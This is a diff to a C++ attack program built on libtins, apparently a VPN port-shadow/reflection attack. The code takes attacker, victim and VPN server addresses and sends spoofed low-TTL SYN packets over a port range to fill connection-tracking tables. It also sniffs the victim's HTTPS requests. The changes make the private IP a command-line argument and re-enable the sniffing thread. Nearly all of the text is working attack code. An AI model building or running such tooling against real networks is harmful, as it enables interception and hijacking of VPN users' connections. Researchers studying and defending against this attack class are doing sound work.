@@ -29,6 +29,7 @@ string attacker_pub_ip;
 
 string victim_ip;
 unsigned short victim_port;
+string private_ip;
 
 // The port for the VPN Server UDP-port shadow (reflection)
 string vpn_ip;
@@ -149,9 +150,7 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 	const IP &ip = some_pdu.rfind_pdu<IP>();
 	const TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
 	unsigned short vport;
-//define IPPROTO_TCP 6
-	if(ip.protocol()==IPPROTO_TCP && ip.dst_addr()=="10.8.0.6") 
-	std::cout<<"FOUND: "<<ip.src_addr() <<" : "<<tcp_req.sport()<<" -> "<<ip.dst_addr()<<" : "<<tcp_req.dport()<<"\n";
+//define IPPROTO_TCP 6 
 	if (ip.src_addr() == victim_ip && ip.protocol() == IPPROTO_TCP &&
 			tcp_req.dport()==https_port) {
 
@@ -169,7 +168,7 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 		// sender.send(pkt, iface);
 		std::cout << "HTTP Filler - client web port: " << vport << std::endl; 
 		// TCP packets placed in the ASSURED state
-		IP resppkt = IP(victim_ip, "10.8.0.14") / TCP(vport, https_port); 
+		IP resppkt = IP(victim_ip, private_ip) / TCP(vport, https_port); 
 		IP& respip = resppkt.rfind_pdu<IP>();
 		respip.ttl(2);
 		TCP &resptcp = resppkt.rfind_pdu<TCP>(); 
@@ -200,11 +199,10 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 void do_fill_table() {
         PacketSender sender;
         NetworkInterface iface("tun0"); // public_iface);//  
-		std::cout<<"Filling\n";
         while (tcp_continue_ephem) {
 		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                         // TCP packets placed in the ASSURED state
-                        IP pkt = IP(victim_ip, "10.8.0.14") / TCP(i, https_port); 
+                        IP pkt = IP(victim_ip, private_ip) / TCP(i, https_port); 
 			IP& ip = pkt.rfind_pdu<IP>();
 			ip.ttl(2);
                         TCP &tcp = pkt.rfind_pdu<TCP>(); 
@@ -213,7 +211,6 @@ void do_fill_table() {
                         tcp.set_flag(TCP::SYN, 1); 
 			sender.send(pkt, iface);
                 }
-		std::cout<<"done\n";
 		usleep(10000000);
         }
 }
@@ -273,8 +270,8 @@ void create_send_socket() {
 
 int main(int argc, char** argv) {
       
-	if (argc != 8) {
-		cout << "sike wrong number of args ---> (public_iface, attacker_pub_ip, victim_ip, vpn_ip, vpn_port, https_port, webdnsserver_ip)\n";
+	if (argc != 9) {
+		cout << "sike wrong number of args ---> (public_iface, attacker_pub_ip, victim_ip, vpn_ip, vpn_port, https_port, webdnsserver_ip, private_ip)\n";
 		return 0;
 	}
 	public_iface = argv[1];
@@ -287,6 +284,8 @@ int main(int argc, char** argv) {
 
 	https_port = atoi(argv[6]);
 	webdnsserver_ip = argv[7];
+	private_ip = argv[8];
+	
 
 	// Need to bind to this port because the victim will send packets
 	// to the tun interface's ip address and the VPN listening port 
@@ -296,8 +295,8 @@ int main(int argc, char** argv) {
 	thread fill_table_thread(do_fill_table);
 	fill_table_thread.detach();
 
-	// thread sniff_http_request(sniff_website_request_handler);
-	// sniff_http_request.join();
+	thread sniff_http_request(sniff_website_request_handler);
+	sniff_http_request.join();
 
         // Get the UDP boomerang ready	
 	//
@@ -322,6 +321,5 @@ int main(int argc, char** argv) {
 	thread relay_thread(relay_packet_handler);
 	relay_thread.join();
 	*/
-	while(1);
 	return 0;
 }
